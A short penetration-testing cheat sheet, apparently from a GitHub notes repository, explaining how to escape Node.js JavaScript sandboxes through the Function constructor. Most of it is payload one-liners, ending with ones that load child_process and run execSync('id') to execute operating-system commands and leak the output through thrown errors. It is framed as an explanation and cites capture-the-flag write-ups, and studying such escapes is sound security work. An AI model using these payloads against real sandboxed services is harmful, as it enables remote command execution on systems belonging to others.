# more languages and technologies will be addes soon 

## nodejs sandbox bypass 101

this payloads or techniques not necessarily to work on real targets , it just explainging how to do it 

### constructor function 
A constructor function in JavaScript is a special type of function that is used to create and initialize objects , so we can use it to create functions since functions are objects in javascript


### the idea of bypass is to access the constructor property of a function to create your evil functions bypassing restricted rules which is set in the sandbox , so  create object access function or any property which reffer to a function then access its constructor property which refers to the constructor function (note `"".constructor()` is a function )

![Screenshot_20230808_161658](https://github.com/kiro6/penetration-testing-notes/assets/57776872/bef0f085-20c3-428f-810e-5271d67d4de2)

  
- examples 
```js

# ''.split.constructor()() === ''["split"]["constructor"]("console.log(1)")()

[].push.constructor("console.log(1)")()

"".split.constructor("console.log(1)")()

"".constructor.constructor("console.log(1)")()

''["sub"]["constructor"]('console.log(1)')()

Number(1).constructor.constructor("console.log(1)")()

```

### we have another technique to understand it i recommend reading [this](http://kangax.github.io/nfe/)

```js

(function (y) {return ''[!y?'__proto__':'constructor']['constructor']})('constructor')('console.log(1)')()

(function(prop) { return ''[prop ? "constructor":"benign"  ][prop] })("constructor")("console.log(1)")()

(function({anything}){return anything.constructor})({anything:"".split})("console.log(1)")()

```

### ofcourse we can do more than just console , here is how to import modules inside the evil functions you create

```
process.mainModule.require("child_process").execSync("id")

global.process.mainModule.constructor._load("child_process").execSync("id")
```

### final examples 

```
(function (y) {return ''[!y?'__proto__':'constructor']['constructor']})('constructor')('throw new SyntaxError(process.mainModule.require(\"child_process\").execSync(\"id\").toString())')()


"".sub.constructor('throw new SyntaxError(process.mainModule.require(\"child_process\").execSync(\"id\").toString())')()


(function({book}){return book.constructor})({book:"".sub})("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()

```

#### sources 
- https://hilb3r7.github.io/walkthroughs/babybreakinggrad.html
- https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/
